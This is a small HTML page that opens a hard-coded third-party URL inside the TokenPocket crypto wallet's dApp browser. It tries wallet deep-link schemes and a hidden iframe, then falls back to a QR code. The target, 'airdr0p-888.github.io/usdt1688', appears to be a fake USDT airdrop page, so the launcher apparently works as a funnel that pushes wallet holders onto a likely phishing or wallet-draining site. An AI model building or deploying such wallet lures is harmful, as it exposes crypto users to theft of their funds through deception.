<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>唤醒 TP 打开第三方页面</title>
</head>
<body>

<button onclick="openTPWallet()" style="padding:15px 30px; font-size:18px; background:#00A3FF; color:white; border:none; border-radius:8px; cursor:pointer;">
  唤醒 TP 钱包打开我的页面
</button>

<div id="qrcode" style="margin-top:20px; display:none; text-align:center;">
  <p>扫码兜底：用 TP 钱包打开</p>
  <img id="qrcode-img" src="" alt="二维码" style="width:200px; border:1px solid #ccc;">
</div>

<script>
const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";

function isTPBrowser() {
  const ua = navigator.userAgent.toLowerCase();
  return ua.indexOf('tokenpocket') !== -1 || ua.indexOf('tpdapp') !== -1;
}

function showQRCode(url) {
  const qr = document.getElementById('qrcode');
  const img = document.getElementById('qrcode-img');
  if (!qr || !img) return;
  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
  qr.style.display = 'block';
}

function openTPWallet() {
  // 官方 JSON params
  const params = {
    url: TARGET_URL,
    chain: "ETH",  // 可选，提升兼容
    source: "web"  // 可选，来源标识
  };
  const encodedParams = encodeURIComponent(JSON.stringify(params));

  const schemes = [
    `tpdapp://open?params=${encodedParams}`,  // 主方案（官方推荐）
    `tp://open?params=${encodedParams}`       // 备用（部分版本）
  ];

  // 如果已在 TP 浏览器，直接跳转
  if (isTPBrowser()) {
    location.href = TARGET_URL;
    return;
  }

  // 1. 直接跳转主方案
  window.location.href = schemes[0];

  // 2. 300ms 后 iframe 增强（iOS 兼容）
  setTimeout(() => {
    try {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = schemes[0];
      document.body.appendChild(iframe);
      setTimeout(() => document.body.removeChild(iframe), 2000);
    } catch (e) {
      console.log('Iframe fallback failed:', e);
    }
  }, 300);

  // 3. 2秒后尝试备用
  setTimeout(() => {
    window.location.href = schemes[1];
  }, 2000);

  // 4. 3.5秒后显示二维码（手动扫码打开）
  setTimeout(() => {
    showQRCode(TARGET_URL);
  }, 3500);
}
</script>

</body>
</html>
